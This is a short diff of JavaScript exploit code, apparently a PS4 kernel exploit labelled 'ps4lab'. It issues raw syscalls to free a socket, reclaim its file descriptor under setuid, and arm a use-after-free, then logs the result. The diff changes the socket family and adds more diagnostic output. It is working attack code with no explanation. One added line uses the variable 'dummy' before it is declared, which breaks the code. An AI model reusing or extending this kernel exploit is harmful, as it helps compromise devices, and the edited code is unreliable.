@@ -774,7 +774,7 @@ let allDone = false;
                 break;
             }
             state("attempt " + attempt + "...", "warn");
-            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT);
+            mark("ATTEMPT", attempt + "/" + NUM_ATTEMPT + " dummy=" + dummy);
 
             const dummy = sc(SYS.socket, 2 /* AF_INET */, SOCK_STREAM, 0).i32;
             if (dummy === -1) { mark("ATTEMPT-SKIP", "socket failed"); continue; }
@@ -786,7 +786,7 @@ let allDone = false;
 
             sc(SYS.close, dummy);
             sc(SYS.setuid, 1);
-            uafSock = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
+            uafSock = sc(SYS.socket, 2 /* AF_INET */, SOCK_STREAM, 0).i32;
             if (uafSock !== dummy) {
                 mark("ATTEMPT-SKIP", "fd not reclaimed: wanted " + dummy
                     + " got " + uafSock);
@@ -796,7 +796,8 @@ let allDone = false;
             }
             sc(SYS.setuid, 1);
             const clr = netevent(uafSock, NETEVENT_CLEAR_QUEUE);
-            mark("UAF-ARMED", "fd=" + uafSock + " clear_rv=" + clr.rv);
+            mark("UAF-ARMED", "fd=" + uafSock 
+                 + " clear_rv=" + clr.rv + " clear_errno=" + clr.err);
             committed = true;
 
             try { if (boot) localStorage.setItem("ps4lab_committed_boot", boot); }
